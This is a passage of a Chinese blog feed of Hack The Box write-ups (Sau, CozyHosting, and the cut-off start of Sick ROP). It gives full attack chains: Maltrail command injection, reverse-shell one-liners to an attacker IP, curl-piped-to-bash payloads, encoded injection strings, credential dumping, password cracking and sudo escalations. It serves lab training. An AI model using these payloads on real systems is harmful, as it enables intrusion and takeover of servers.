class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 142</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;forward_url&quot;: &quot;http://127.0.0.1:80/&quot;,</span><br><span class=\"line\">  &quot;proxy_response&quot;: true,</span><br><span class=\"line\">  &quot;insecure_tls&quot;: false,</span><br><span class=\"line\">  &quot;expand_path&quot;: true,</span><br><span class=\"line\">  &quot;capacity&quot;: 250</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这样的话访问路由 add 就相当于访问 http://127.0.0.1:80，接下来访问 add 端口后对其进行目录扫描</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">wfuzz -w &quot;D:\\wordlist\\directoryDicts\\Filenames_or_Directories_All.txt&quot; --hc 404,502 http://10.10.11.224:55555/add/FUZZ</span><br></pre></td></tr></table></figure></p>\n<p>扫描了一些发现已经扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000132:   200        2 L      4 W        26 Ch       &quot;robots.txt&quot;</span><br><span class=\"line\">000000240:   200        73 L     276 W      15051 Ch    &quot;favicon.ico&quot;</span><br><span class=\"line\">000000311:   200        111 L    432 W      7091 Ch     &quot;index&quot;</span><br><span class=\"line\">000000252:   401        0 L      2 W        12 Ch       &quot;login&quot;</span><br><span class=\"line\">000001986:   401        0 L      0 W        0 Ch        &quot;events&quot;</span><br><span class=\"line\">000005704:   200        0 L      1 W        4 Ch        &quot;ping&quot;</span><br></pre></td></tr></table></figure></p>\n<p>接下来一个一个查看路由，index 下提示了这个使用的什么服务</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Powered by Maltrail (v0.53)</span><br><span class=\"line\">Hide threat</span><br><span class=\"line\">Report false positive</span><br></pre></td></tr></table></figure></p>\n<p>去网上找找这个服务的漏洞</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">maltrail是开源的恶意流量检测系统，项目地址：https://github.com/stamparm/maltrail。</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure></p>\n<p>查到了这个项目的漏洞了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">描述</span><br><span class=\"line\">Maltrail &lt;= v0.54 在登录过程中容易受到未经身份验证的操作系统命令注入的影响。</span><br><span class=\"line\"></span><br><span class=\"line\">总结</span><br><span class=\"line\">mailtrail/core/http.py 中的函数在参数中包含命令注入漏洞。subprocess.check_outputparams.get(&quot;username&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">攻击者可以通过将任意操作系统命令注入 username 参数来利用此漏洞。注入的命令将以正在运行的进程的权限执行。此漏洞无需身份验证即可远程利用。</span><br><span class=\"line\"></span><br><span class=\"line\">概念验证</span><br><span class=\"line\">curl &#x27;http://hostname:8338/login&#x27; \\</span><br><span class=\"line\">  --data &#x27;username=;`id &gt; /tmp/bbq`&#x27;</span><br><span class=\"line\">冲击</span><br><span class=\"line\">任意命令执行</span><br></pre></td></tr></table></figure></p>\n<p>也就是说在 login 页面发送 username=;`` 就能任意命令执行</p>\n<p>虽然能够执行命令但是无法直接回显出内容很操作</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>直接反弹 shell</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>\n<p>使用 urlencode</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%62%61%73%68%24%7b%49%46%53%7d%2d%69%24%7b%49%46%53%7d%3e%26%24%7b%49%46%53%7d%2f%64%65%76%2f%74%63%70%2f%31%30%2e%31%30%2e%31%34%2e%35%34%2f%39%39%39%39%24%7b%49%46%53%7d%30%3e%26%31</span><br></pre></td></tr></table></figure></p>\n<p>发现反弹不上去</p>\n<p>使用获取反弹试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">本地写一个shell.sh然后在使用python -m http.server</span><br><span class=\"line\">相当于本地开启了8000端口</span><br><span class=\"line\">`curl 10.10.14.54:8000/shell.sh|bash`</span><br></pre></td></tr></table></figure></p>\n<p>不晓得为什么不行</p>\n<p>那直接使用其他的</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((</span><br><span class=\"line\">&quot;10.10.14.54&quot;,9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">curl &#x27;http://10.10.11.224:55555/add/login&#x27; --data &#x27;username=;`echo &quot;cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoCiIxMC4xMC4xNC41NCIsOTk5OSkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oIi9iaW4vYmFzaCIpJw==&quot;|base64 -d|sh`&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.224] 37542</span><br><span class=\"line\">puma@sau:/opt/maltrail$ ls</span><br></pre></td></tr></table></figure></p>\n<p>在 puma 的目录下就有一个 flag</p>\n<h4 id=\"提取\"><a class=\"anchor\" href=\"#提取\">#</a> 提取</h4>\n<p>使用 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for puma on sau:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User puma may run the following commands on sau:</span><br><span class=\"line\">    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>提示能执行 systemctl</p>\n<p>那好办了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/systemctl/</span><br></pre></td></tr></table></figure></p>\n<p>直接照搬 exp 的话可能需要你输入 puma 的密码这个时候就只有使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/systemctl status trail.service</span><br><span class=\"line\">!sh</span><br></pre></td></tr></table></figure></p>\n<p>因为上面现在不需要密码的只有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service</span><br></pre></td></tr></table></figure></p>\n<p>然后在 root 目录下得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-CozyHosting/",
            "url": "https://lookhui.github.io/HTB-CozyHosting/",
            "title": "HTB-CozyHosting",
            "date_published": "2023-12-13T11:29:44.000Z",
            "content_html": "<h1 id=\"cozyhosting\"><a class=\"anchor\" href=\"#cozyhosting\">#</a> CozyHosting</h1>\n<p>nmap 扫描靶机</p>\n<p>同时访问靶机</p>\n<p>url 变成了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/</span><br></pre></td></tr></table></figure></p>\n<p>这个时候把这个域名加到 hosts</p>\n<p>如</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.230 cozyhosting.htb</span><br></pre></td></tr></table></figure></p>\n<p>使用 nmap 普通扫描扫描内容如下</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-13 19:38 中国标准时间</span><br><span class=\"line\">Nmap scan report for cozyhosting.htb (10.10.11.230)</span><br><span class=\"line\">Host is up (0.34s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 7.90 seconds</span><br></pre></td></tr></table></figure></p>\n<p>先从 80 端口下手</p>\n<p>先扫描目录</p>\n<p>目录扫描扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">000000022:   401        0 L      1 W        97 Ch       &quot;admin&quot;</span><br><span class=\"line\">000000251:   200        96 L     196 W      4431 Ch     &quot;login&quot;</span><br><span class=\"line\">000000314:   500        0 L      1 W        73 Ch       &quot;error&quot;</span><br><span class=\"line\">000000310:   200        284 L    745 W      12706 Ch    &quot;index&quot;</span><br><span class=\"line\">000013836:   204        0 L      0 W        0 Ch        &quot;logout&quot;</span><br><span class=\"line\">000017286:   400        0 L      32 W       431 Ch      &quot;system\\&quot;</span><br></pre></td></tr></table></figure></p>\n<p>访问 error 报错爆的是 java 的 spring boot 框架的错误，使用专门扫路由的字典扫描到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">actuator</span><br></pre></td></tr></table></figure></p>\n<p>访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://cozyhosting.htb/actuator</span><br></pre></td></tr></table></figure></p>\n<p>查看到了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;_links&quot;: &#123;</span><br><span class=\"line\">    &quot;self&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;sessions&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/sessions&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;beans&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/beans&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;health-path&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/health/&#123;*path&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;env-toMatch&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/env/&#123;toMatch&#125;&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: true</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    &quot;mappings&quot;: &#123;</span><br><span class=\"line\">      &quot;href&quot;: &quot;http://localhost:8080/actuator/mappings&quot;,</span><br><span class=\"line\">      &quot;templated&quot;: false</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>访问 sessions 路由得到</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  &quot;3FFF49C67E9B7FE5A7B867EA4AF08D00&quot;: &quot;kanderson&quot;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>这个应该是 JSESSIONID</p>\n<p>也就是 cookie 以这个 jsessionid 去访问 admin 路由</p>\n<p>然后进去 admin 网页后能看到这个 ssh 的连接方式，我们使用 ' 能够测试出这个的报错</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Location: http://cozyhosting.htb/admin?error=</span><br><span class=\"line\">/bin/bash: -c: line 1: unexpected EOF while looking for matching `&#x27;&#x27;</span><br><span class=\"line\">/bin/bash: -c: line 2: syntax error: unexpected end of file</span><br></pre></td></tr></table></figure></p>\n<p>这样的话我们试试反弹 shell</p>\n<p>尝试了直接反弹发现没有一点反应那就</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class=\"line\">得到base64</span><br><span class=\"line\">然后在构造解码</span><br><span class=\"line\">;echo$&#123;IFS&#125;&quot;YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41NC85OTk5IDA+JjEK&quot;|base64$&#123;IFS&#125;-d|$&#123;IFS&#125;bash;</span><br><span class=\"line\">直接上传发现还是不行，那就使用url加密一下如</span><br><span class=\"line\">%3b%65%63%68%6f%24%7b%49%46%53%7d%22%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%31%4e%43%38%35%4f%54%6b%35%49%44%41%2b%4a%6a%45%4b%22%7c%62%61%73%65%36%34%24%7b%49%46%53%7d%2d%64%7c%24%7b%49%46%53%7d%62%61%73%68%3b</span><br></pre></td></tr></table></figure></p>\n<p>然后本地开启监听</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">nc -lvnp 9999</span><br></pre></td></tr></table></figure></p>\n<p>反弹成功，</p>\n<p>ls 看到 app 下面的 jar 包</p>\n<p>然后在通过 nc 或者 python 从上面把这个 jar 包下载到本地进行分析</p>\n<p>在看看用户执行 cat /etc/passwd</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:100:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:104::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:105:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:106:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:107:113::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">app:x:1001:1001::/home/app:/bin/sh</span><br><span class=\"line\">postgres:x:114:120:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash</span><br><span class=\"line\">josh:x:1003:1003::/home/josh:/usr/bin/bash</span><br><span class=\"line\">_laurel:x:998:998::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>这种渗透我们一定要注意的是这些有 /bin/sh 的也就是能够执行命令的用户</p>\n<p>如 josh 和 postgres 以及 app</p>\n<p>下载好后直接通过 jd-gui 来直接进行反编译分析</p>\n<p>通过查看 application.properties 得到了 PostgreSQL 数据库账号以及密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">psql -h 127.0.0.1 -U postgres</span><br></pre></td></tr></table></figure></p>\n<p>这个数据库使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">\\c cozyhosting</span><br><span class=\"line\"></span><br><span class=\"line\">\\d</span><br><span class=\"line\">select * from users;</span><br></pre></td></tr></table></figure></p>\n<p>得到密码的 hash 值</p>\n<p>通过非常牛逼的 join 来对 hash 值进行破解</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john ./admin.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 1024 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>通过 john 解出密码为</p>\n<p>manchesterunited</p>\n<p>我们去尝试使用 josh 去 ssh 登录</p>\n<p>发现登录成功并且在目录下还有一个 user.txt 这个就是我们的第一个 flag</p>\n<p>尝试提取</p>\n<p>sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Matching Defaults entries for josh on localhost:</span><br><span class=\"line\">    env_reset, mail_badpass,</span><br><span class=\"line\">    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User josh may run the following commands on localhost:</span><br><span class=\"line\">    (root) /usr/bin/ssh *</span><br></pre></td></tr></table></figure></p>\n<p>发现竟然能调动 root 的 /usr/bin/ssh</p>\n<p>那好办多了</p>\n<p>参考链接</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">https://gtfobins.github.io/gtfobins/ssh/#sudo</span><br></pre></td></tr></table></figure></p>\n<p>使用了</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo ssh -o ProxyCommand=&#x27;;sh 0&lt;&amp;2 1&gt;&amp;2&#x27; x</span><br></pre></td></tr></table></figure></p>\n<p>输入密码得到 flag2</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Sick-ROP/",
            "url": "https://lookhui.github.io/HTB-Sick-ROP/",
            "title": "HTB-Sick_ROP",
            "date_published": "2023-12-13T11:04:07.000Z",
            "content_html": "<h1 id=\"sick-rop\"><a class=\"anchor\" href=\"#sick-rop\">#</a> Sick ROP</h1>\n<p>常规套路检查</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Arch:     amd64-64-little</span><br><span class=\"line\">RELRO:    No RELRO</span><br><span class=\"line\">Stack:    No canary found</span><br><span class=\"line\">NX:       NX enabled</span><br><span class=\"line\">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure></p>\n<p>使用 strings</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">rop.asm</span><br><span class=\"line\">read</span><br><span class=\"line\">write</span><br><span class=\"line\">vuln</span><br><span class=\"line\">__bss_start</span><br><span class=\"line\">_edata</span><br><span class=\"line\">_end</span><br><span class=\"line\">.symtab</span><br><span class=\"line\">.strtab</span><br><span class=\"line\">.shstrtab</span><br><span class=\"line\">.text</span><br></pre></td></tr></table></figure></p>\n<p>发现貌似没有什么可利用的点</p>\n<p>本地运行调试发现我输出什么他就会照样输出</p>\n<p>是静态的话我们使用 ROPgadget --binary sick_rop --ropchain</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span 